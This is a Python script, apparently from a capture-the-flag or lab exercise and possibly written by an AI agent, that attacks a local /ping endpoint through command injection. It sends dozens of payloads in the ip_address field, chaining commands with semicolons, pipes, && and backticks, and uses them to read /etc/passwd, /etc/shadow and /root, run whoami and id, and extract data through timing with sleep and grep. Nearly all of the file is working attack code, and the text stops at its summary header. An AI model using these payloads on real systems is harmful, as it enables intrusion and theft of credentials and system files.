#!/usr/bin/env python3
"""
Refined Boolean-Based Command Injection Exfiltration
Target: http://127.0.0.1:32943

From initial testing, we observed:
- Simple command (127.0.0.1) returns "REACHABLE"
- Commands with pipe (127.0.0.1 | anything) return "UNREACHABLE"
- This suggests we need to explore alternative boolean channels
"""

import requests
import time

BASE_URL = "http://127.0.0.1:32943"
TIMEOUT = 30

def send_ping(payload):
    """Send command injection probe to /ping endpoint via POST"""
    try:
        url = f"{BASE_URL}/ping"
        data = {"ip_address": payload}
        resp = requests.post(url, data=data, timeout=TIMEOUT)
        
        # Determine response type
        resp_lower = resp.text.lower()
        if "reachable" in resp_lower and "unreachable" not in resp_lower:
            result = "REACHABLE"
        elif "unreachable" in resp_lower:
            result = "UNREACHABLE"
        else:
            result = f"OTHER: {resp.text[:200]}"
        
        return {
            "status": resp.status_code,
            "result": result,
            "time": resp.elapsed.total_seconds(),
            "response": resp.text
        }
    except requests.RequestException as e:
        return {"error": str(e)}

# ============================================================
# TESTING: Understanding the boolean logic
# ============================================================

print("="*70)
print("ANALYZING BOOLEAN BEHAVIOR")
print("="*70)

# Test baseline behaviors
baseline_tests = [
    ("Valid IP only", "127.0.0.1"),
    ("Valid IP | true", "127.0.0.1 | true"),
    ("Valid IP | false", "127.0.0.1 | false"),
    ("Valid IP | sleep 0", "127.0.0.1 | sleep 0"),
    ("Valid IP | sleep 1", "127.0.0.1 | sleep 1"),
    ("Valid IP ; true", "127.0.0.1 ; true"),
    ("Valid IP ; false", "127.0.0.1 ; false"),
    ("Valid IP && true", "127.0.0.1 && true"),
    ("Valid IP && false", "127.0.0.1 && false"),
    ("Valid IP || true", "127.0.0.1 || true"),
    ("Valid IP || false", "127.0.0.1 || false"),
]

print("\nBaseline behavior tests:")
print("-"*60)
for name, payload in baseline_tests:
    result = send_ping(payload)
    print(f"{name:30} => {result.get('result', result.get('error'))} ({result.get('time', 0):.2f}s)")
    time.sleep(0.3)

# ============================================================
# TESTING: Time-Based Exfiltration
# ============================================================

print("\n" + "="*70)
print("TIME-BASED EXFILTRATION TESTS")
print("="*70)

time_based_tests = [
    ("No delay", "127.0.0.1"),
    ("sleep 0", "127.0.0.1; sleep 0"),
    ("sleep 1", "127.0.0.1; sleep 1"),
    ("sleep 2", "127.0.0.1; sleep 2"),
    
    # Conditional time-based
    ("sleep if true", "127.0.0.1; $(sleep 1)"),
    ("bash -c sleep", "127.0.0.1; bash -c 'sleep 1'"),
    
    # Using ping count delays
    ("ping -c 1 localhost", "127.0.0.1; ping -c 1 127.0.0.1"),
    ("ping -c 2 localhost", "127.0.0.1; ping -c 2 127.0.0.1"),
    
    # Conditional delays with grep
    ("grep match -> sleep", "127.0.0.1; grep root /etc/passwd && sleep 1"),
    ("grep no match -> sleep", "127.0.0.1; grep NONEXISTENT /etc/passwd && sleep 1"),
    ("grep match || sleep", "127.0.0.1; grep root /etc/passwd || sleep 1"),
    ("grep no match || sleep", "127.0.0.1; grep NONEXISTENT /etc/passwd || sleep 1"),
]

print("\nTiming-based extraction tests:")
print("-"*60)
for name, payload in time_based_tests:
    start = time.time()
    result = send_ping(payload)
    elapsed = time.time() - start  # Wall-clock time
    
    print(f"{name:30} => {result.get('result', 'ERROR')} (elapsed: {elapsed:.2f}s, server_time: {result.get('time', 0):.2f}s)")

# ============================================================
# TESTING: Alternative Boolean Channels
# ============================================================

print("\n" + "="*70)
print("ALTERNATIVE BOOLEAN CHANNEL TESTS")
print("="*70)

# Try to find operators that give different responses
alternative_tests = [
    # Semicolon with exit code manipulation
    ("; true", "127.0.0.1; true"),
    ("; false", "127.0.0.1; false"),
    
    # AND operator
    ("&& true", "127.0.0.1 && true"),
    ("&& false", "127.0.0.1 && false"),
    ("&& echo test", "127.0.0.1 && echo test"),
    
    # OR operator  
    ("|| true", "127.0.0.1 || true"),
    ("|| false", "127.0.0.1 || false"),
    
    # Command substitution affecting flow
    ("; \$(echo)", "127.0.0.1; $(echo)"),
    ("; \$(false)", "127.0.0.1; $(false)"),
    ("; \`false\`", "127.0.0.1; `false`"),
    
    # Subshell influence
    ("; (true)", "127.0.0.1; (true)"),
    ("; (false)", "127.0.0.1; (false)"),
    
    # Exit code checking
    ("; /bin/true", "127.0.0.1; /bin/true"),
    ("; /bin/false", "127.0.0.1; /bin/false"),
    
    # Conditional execution with grep success/failure
    ("; grep root /etc/passwd", "127.0.0.1; grep root /etc/passwd"),
    ("; grep NONEXISTENT /etc/passwd", "127.0.0.1; grep NONEXISTENT /etc/passwd"),
]

print("\nAlternative boolean channels:")
print("-"*60)
for name, payload in alternative_tests:
    result = send_ping(payload)
    print(f"{name:30} => {result.get('result', result.get('error'))}")
    time.sleep(0.3)

# ============================================================
# TESTING: Direct Output Channel Testing
# ============================================================

print("\n" + "="*70)
print("DIRECT OUTPUT CHANNEL TESTS")
print("="*70)

# Try to get command output into the response
output_tests = [
    ("; echo TEST", "127.0.0.1; echo TEST"),
    ("; cat /etc/passwd", "127.0.0.1; cat /etc/passwd"),
    ("; whoami", "127.0.0.1; whoami"),
    ("; id", "127.0.0.1; id"),
    ("; uname -a", "127.0.0.1; uname -a"),
    ("; ls -la", "127.0.0.1; ls -la"),
    ("; pwd", "127.0.0.1; pwd"),
    
    # Try to corrupt the ping processing to return output
    ("| echo TEST", "127.0.0.1 | echo TEST"),
    ("| cat /etc/passwd", "127.0.0.1 | cat /etc/passwd"),
    
    # Backticks
    ("\`echo TEST\`", "127.0.0.1 `echo TEST`"),
    ("\`whoami\`", "127.0.0.1 `whoami`"),
    
    # Command substitution in different positions
    ("; \$(cat /etc/passwd)", "127.0.0.1; $(cat /etc/passwd)"),
    
    # Injection into output directly
    ("test; cat /etc/passwd #", "127.0.0.1; cat /etc/passwd #"),
    ("test && cat /etc/passwd", "127.0.0.1 && cat /etc/passwd"),
]

print("\nDirect output channel tests (checking if output appears in response):")
print("-"*60)
for name, payload in output_tests:
    result = send_ping(payload)
    response = result.get('response', '')
    
    # Check for any interesting content in response
    flags = []
    if "TEST" in response:
        flags.append("FOUND:TEST")
    if "root:" in response:
        flags.append("FOUND:root")
    if "whoami output" in response.lower() or response.count("\n") > 5:
        flags.append("MULTILINE")
    
    flag_str = ", ".join(flags) if flags else "no output"
    print(f"{name:30} => {result.get('result')} [{flag_str}]")
    print(f"  Response excerpt: {response[:250]}")
    time.sleep(0.3)

# ============================================================
# TESTING: Error-Based Exfiltration
# ============================================================

print("\n" + "="*70)
print("ERROR-BASED EXFILTRATION TESTS")
print("="*70)

error_tests = [
    # Cause errors that might leak info
    ("; cat /nonexistent", "127.0.0.1; cat /nonexistent 2>&1"),
    ("; ls /root", "127.0.0.1; ls /root 2>&1"),
    ("; file /etc/shadow", "127.0.0.1; file /etc/shadow 2>&1"),
    
    # Generate syntax errors or stderr
    ("; bash -c 'invalid cmd'", "127.0.0.1; bash -c 'invalid_command_xyz' 2>&1"),
]

print("\nError-based extraction:")
print("-"*60)
for name, payload in error_tests:
    result = send_ping(payload)
    print(f"{name:30} => {result.get('result')}")
    print(f"  Response: {result.get('response', 'N/A')[:300]}")
    time.sleep(0.3)

# ============================================================
# SUMMARY
# ============================================================

print("\n" + "="*70)
print("FINAL SUMMARY")
